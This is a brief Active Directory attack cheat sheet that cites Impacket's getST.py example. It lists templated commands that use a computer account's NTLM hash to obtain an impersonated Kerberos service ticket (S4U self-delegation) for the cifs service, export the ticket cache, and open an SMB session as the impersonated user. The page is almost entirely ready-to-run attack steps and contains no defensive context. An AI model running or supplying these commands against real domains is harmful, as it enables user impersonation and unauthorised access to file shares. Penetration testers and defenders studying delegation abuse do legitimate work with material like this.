### Source
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/getST.py  

### Create service ticket using computer account and delegate ticket to impersonate user
```
impacket-getST -self -impersonate "<targetUser>" -altservice "cifs/<fqdnComputer>" -dc-ip <domainController> '<domain>/<computerAccount$>' -hashes :<ntlmHash>
```

### Export ticket
```
export KRB5CCNAME=<impersonateUser>.ccache
```

### Use ticket
```
impacket-smbclient -k -no-pass <fqdnRhost> -dc-ip <domainController>
```

